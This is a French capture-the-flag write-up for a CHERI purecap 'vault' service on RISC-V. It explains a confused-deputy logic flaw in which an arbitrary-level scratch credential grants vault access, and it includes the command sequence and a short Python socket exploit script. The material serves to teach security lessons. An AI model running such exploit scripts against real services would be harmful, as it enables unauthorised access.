# PWN#Zeta — vault CHERI purecap (escalade via scratch credential)

- **Auteur :** lyons

- **Catégorie :** pwn
- **Points :** 150
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (TCP, menu en mode interactif)
- **Binaire :** `vault` — ELF RISC-V 64-bit, CHERI purecap, PIE, stripped, FreeBSD 15

## Cadre

Le service se présente comme un « vault terminal » compilé en **CHERI purecap** (CheriBSD).
CHERI dote les pointeurs de capabilities matérielles : chacun transporte ses bornes
et ses permissions, ce qui bloque les corruptions mémoire habituelles (buffer overflow,
UAF avec déréférencement arbitraire, etc.).

Il s'agit d'arracher le message `ACCESS GRANTED` à la commande `vault_open`.

## Menu

```
[1] create_profile <name>       — crée un profil cosmétique (tier=1)
[2] link_profile <profile_id>   — tente de lier un profil au vault
[3] rename_profile <profile_id> — renomme un profil (24 bytes max)
[4] destroy_profile <profile_id>— libère un profil
[5] vault_preview               — crée un handle (preview credential, level=1)
[6] vault_scratch <level>       — définit un scratch credential avec un level arbitraire
[7] vault_open <handle_id>      — ouvre le vault avec un handle
[8] debug_dump_profile           — affiche name/tier d'un profil (lecture seule)
[0] quit
```

## Examen

### Constats

1. `create_profile` fabrique un profil portant `tier=1`. Ce tier est « cosmetic only »,
   sans lien possible avec le vault.
2. `link_profile` refuse toute liaison d'un profil tier=1 : « not vault-linkable (cosmetic only) ».
3. `vault_preview` (cmd 5) engendre un **handle** muni de `level=1` (preview credential).
4. `vault_scratch` (cmd 6) tolère un **level au choix** et imprime
   « scratch credential set (level=N, not saved anywhere) ».
5. `vault_open` (cmd 7), muni d'un handle, contrôle le level du credential courant.

### Défaut : scratch credential toujours vivant en mémoire

La mention « not saved anywhere » attachée au scratch credential induit en erreur. Le credential
est bel et bien posé en mémoire pour la session en cours. Au moment où `vault_open` contrôle le
niveau d'accès, c'est le **scratch credential** (doté d'un level élevé) qui est consulté, non
le preview credential (level=1).

CHERI tient à distance toute corruption mémoire, mais la **logique applicative** reste exposée :
le scratch credential n'est aucunement isolé du credential actif consulté par `vault_open`.

## Marche à suivre

### Ordre des commandes

```
1          → create_profile
<name>     → nom quelconque
5          → vault_preview (crée handle 0, level=1)
6          → vault_scratch
9999       → level arbitraire élevé
7          → vault_open
0          → handle 0 → ACCESS GRANTED
```

### Script en un coup

```python
#!/usr/bin/env python3
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "<HOST>"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else <PORT>

commands = b"1\npwn\n5\n6\n9999\n7\n0\n0\n"

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
s.sendall(commands)
out = b""
while True:
    try:
        chunk = s.recv(8192)
        if not chunk:
            break
        out += chunk
    except socket.timeout:
        break
s.close()

for line in out.decode(errors="replace").splitlines():
    if "ACCESS GRANTED" in line:
        print(line.strip())
        break
```

### Ce qu'on obtient

```
ACCESS GRANTED: CTF{REDACTED}
```

## Bilan

- **CHERI bloque la corruption mémoire, non les bugs logiques.** Les capabilities
  matérielles garantissent l'intégrité des pointeurs ; dès lors que la logique de contrôle d'accès
  est mal ficelée, le programme demeure attaquable.
- Le scratch credential prétendument « non sauvegardé » continue de vivre en mémoire et pèse sur les
  vérifications de `vault_open` — cas d'école de **confused deputy** : le programme s'appuie sur un
  credential qui n'aurait jamais dû arbitrer les décisions d'accès.
- Les entrées « decoy » (`debug_dump`, estampillé « read-only, bounded ») comme les libellés
  mensongers (« not saved anywhere ») relèvent de la diversion assumée.
- À l'inverse des autres vaults du CTF (Alpha→Epsilon) bâtis sur des stack overflows et du ROP,
  Zeta est purement logique — aucune corruption mémoire ne passe, CHERI veille.

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **lyons** — BUG|PWN CTF · PWN#Zeta.*
